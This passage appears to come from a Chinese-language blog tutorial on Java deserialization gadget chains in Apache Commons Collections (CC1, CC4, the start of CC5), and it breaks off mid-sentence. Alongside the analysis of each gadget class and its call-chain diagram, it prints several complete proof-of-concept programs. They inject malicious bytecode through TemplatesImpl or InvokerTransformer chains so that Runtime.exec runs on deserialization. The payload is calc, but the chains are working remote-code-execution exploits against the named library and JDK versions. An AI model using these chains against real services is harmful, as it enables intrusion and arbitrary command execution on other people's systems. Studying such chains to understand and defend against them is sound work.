title="AnnotationInvocationHandler版本"></a>AnnotationInvocationHandler版本</h3><p>下一步就是寻找调用了get()的地方,然后找到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>invoke</code></p><pre><code class="java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 = var2.getName();        Class[] var5 = var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length != 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            switch (var4) &#123;                case &quot;toString&quot;:                    return this.toStringImpl();                case &quot;hashCode&quot;:                    return this.hashCodeImpl();                case &quot;annotationType&quot;:                    return this.type;                default:                    Object var6 = this.memberValues.get(var4);                    if (var6 == null) &#123;                        throw new IncompleteAnnotationException(this.type, var4);                    &#125; else if (var6 instanceof ExceptionProxy) &#123;                        throw ((ExceptionProxy)var6).generateException();                    &#125; else &#123;                        if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;                            var6 = this.cloneArray(var6);                        &#125;                        return var6;                    &#125;            &#125;        &#125;    &#125;</code></pre><p>这个类的构造方法如下：this.memberValues 可控，设置 this.memberValues 为我们构造的 LazyMap，但是这里存在一个if判断，第一个参数类型必须是注解</p><pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;        Class[] var3 = var1.getInterfaces();        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;            this.type = var1;            this.memberValues = var2;        &#125; else &#123;            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);        &#125;    &#125;</code></pre><p>下一步就要想如何调用这个<code>invoke</code>方法</p><p>这部分涉及到 java 的动态代理。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法，有点像php里的 _call() 只不过 _call() 在调用不存在的方法才触发</p><pre><code class="java">//实例一个 AnnotationInvocationHandler 类Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数construct.setAccessible(true);//这里第一个参数必须是注释类型的InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazyMap);// 创建 AnnotationInvocationHandler 的代理Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);//调用代理对象的任意方法proxyMap.size();</code></pre><p>这里可以调用任意方法触发，只要找到一个readObject有对我们的代理对象调用任意方法就行，最后使用的是AnnotationInvocationHandler的readObject方法</p><pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;        var1.defaultReadObject();        AnnotationType var2 = null;        try &#123;            var2 = AnnotationType.getInstance(this.type);        &#125; catch (IllegalArgumentException var9) &#123;            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var3 = var2.memberTypes();        Iterator var4 = this.memberValues.entrySet().iterator();        while(var4.hasNext()) &#123;            Map.Entry var5 = (Map.Entry)var4.next();            String var6 = (String)var5.getKey();            Class var7 = (Class)var3.get(var6);            if (var7 != null) &#123;                Object var8 = var5.getValue();                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));                &#125;            &#125;        &#125;    &#125;</code></pre><p>这里需要再实例化一个AnnotationInvocationHandler 包裹的代理对象 proxyMap</p><pre><code class="java">handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);</code></pre><p>然后对这个类进行序列化和反序列化</p><pre><code class="java">serialize(handler);unserialize(&quot;ser.bin&quot;);</code></pre><p>利用链如下：</p><pre><code class="mermaid">graph TBA(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\nreadObject()&quot;)--&gt;B(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()&quot;)B(&quot;sun.reflect.annotation.AnnotationInvocationHandler#\ninvoke()&quot;)--&gt;C(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)C(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;D(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)D(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)E(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;F(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)F(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;K(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>最后的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import java.util.PriorityQueue;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap();        Map lazyMap = LazyMap.decorate(map,transformerChain);//        lazyMap.get(&quot;a&quot;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazyMap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="TiedMapEntry版本"><a href="#TiedMapEntry版本" class="headerlink" title="TiedMapEntry版本"></a>TiedMapEntry版本</h3><p>接着上面LazyMap的get()方法，在CC1中还有另外一条路可走，那就是<code>TiedMapEntry</code>这个类</p><pre><code class="java">public Object getValue() &#123;        return map.get(key);    &#125;public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;public TiedMapEntry(Map map, Object key) &#123;        super();        this.map = map;        this.key = key;    &#125;</code></pre><p>这个<code>getValue</code>方法调用了get()方法，其中map可以通过构造函数赋值，<code>hashCode</code>方法调用了getValue方法</p><pre><code class="java">TiedMapEntry tiedmapentry= new TiedMapEntry(lazyMap,&quot;abc&quot;);tiedmapentry.hashCode();</code></pre><p>下一步就是寻找调用hashCode方法的地方</p><p>在<code>java.util.HashMap</code>, 可以构造<code>hash(tiedmapentry)</code></p><pre><code class="java">static final int hash(Object key) &#123;        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);    &#125;</code></pre><p>但是hash方法不是public类型，只能内部调用</p><p>正好这个类的readObject方法调用了这个hash,结束这个链子</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException &#123;        // Read in the threshold (ignored), loadfactor, and any hidden stuff      .....            for (int i = 0; i &lt; mappings; i++) &#123;                @SuppressWarnings(&quot;unchecked&quot;)                    K key = (K) s.readObject();                @SuppressWarnings(&quot;unchecked&quot;)                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            &#125;        &#125;    &#125;</code></pre><p>整个调用链如下：</p><pre><code class="mermaid">graph TBA(&quot;java.util.HashMap#\nreadObject()&quot;)--&gt;B(&quot;java.util.HashMap#\nhash()&quot;)B(&quot;java.util.HashMap#\nhash()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)--&gt;D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;E(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)E(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)F(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)G(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;M(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>最后的POC</p><pre><code class="java">package org.example;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import java.util.PriorityQueue;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap();        Map lazyMap = LazyMap.decorate(map,transformerChain);//        lazyMap.get(&quot;a&quot;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazyMap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>条件：</p><p>commons-collections4: 4.0</p><p>jdk: &lt;7u21</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>CC4这条链子是CC2和CC3的结合，前半段用了CC2的PriorityQueue以及TransformingComparator，TransformingComparator本来应该调用InvokeTransformer的transform方法的，但是因为InvokeTransformer被ban掉了（CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化），所以用了CC3的chain，里面用的是InstantiateTransformer，用了InstantiateTransformer就必须要进行类实例的构造，也就和cc3后面一样了，也用了TrAXFilter来包装TemplatesImpl。</p><p>前面有分析了，这里就不再BB</p><p>这条链的前半段:</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);        transformerChain.transform(&#39;a&#39;);</code></pre><p>后半段是利用<code>org.apache.commons.collections4.comparators.TransformingComparator</code>的compare来调用这个transform()</p><p>然后就是CC2的内容了：</p><pre><code class="java">TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(transformerChain,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);</code></pre><p>调用链如下：</p><pre><code class="mermaid">graph TBA(&quot;java.util.PriorityQueue#\nreadObject()&quot;) --&gt; B(&quot;java.util.PriorityQueue#\nheapify()&quot;)B(&quot;java.util.PriorityQueue#\nheapify()&quot;)--&gt; C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)C(&quot;java.util.PriorityQueue#\nsiftDown()&quot;)--&gt;D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)D(&quot;java.util.PriorityQueue#\nsiftDownUsingComparator()&quot;)--&gt;E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)E(&quot;org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()&quot;)--&gt;F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)F(&quot;org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()&quot;)--&gt;G(&quot;org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)G(&quot;org.apache.commons.collections4.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)L(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;M(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>完整的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(transformerChain,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk1.8</p><p>因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以TiedMapEntry和BadAttributeValueExpException就被挖掘了出来</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前面部分和CC1一样，这也不多BB了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>下一步寻找调用了get()的地方，还是找到了这个类<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p><pre><code class="java">public Object getValue() &#123;        return map.get(key);    &#125;</code></pre><p>然后寻找调用<code>getValue</code>的地方</p><p>这个跟上面出现过的链子不同，这条链子不在用<code>hashCode</code>这个方法，而是用toString()</p><pre><code class="java"> public String toString() &#123;        return getKey() + &quot;=&quot; + getValue();    &#125;</code></pre><pre><code class="java">TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);tiedmapentry.toString();</code></pre><p>然后找调用了<code>toString()</code>的地方</p><p>然后就找到了这个类<code>javax.management.BadAttributeValueExpException</code></p><pre><code class="java">public BadAttributeValueExpException (Object val) &#123;        this.val = val == null ? null : val.toString();    &#125;private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get(&quot;val&quot;, null);        if (valObj == null) &#123;            val = null;        &#125; else if (valObj instanceof String) &#123;            val= valObj;        &#125; else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) &#123;            val = valObj.toString();        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();        &#125;    &#125;</code></pre><p>这个类的构造函数和readObject都可以调用<code>toString()</code>，如果使用的是构造函数触发，直接<code>new BadAttributeValueExpException(tiedmapentry);</code>就触发了，如果使用readObject()触发，这里需要通过反射给参数val赋值</p><p>再这个readObject中，需要控制<code>valObj </code>的值为tiedmapentry, 而valObj的值来源于</p><pre><code class="java">ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get(&quot;val&quot;, null);</code></pre><p>就是通过 <code>ois.readFields()</code> 方法获取一个 <code>ObjectInputStream.GetField</code> 对象，该对象可以读取对象的字段值,然后通过 <code>gf.get(&quot;val&quot;, null)</code> 方法获取字段名为 “val” 的字段值,如果该值为 null，将 <code>val</code> 设置为 null</p><pre><code 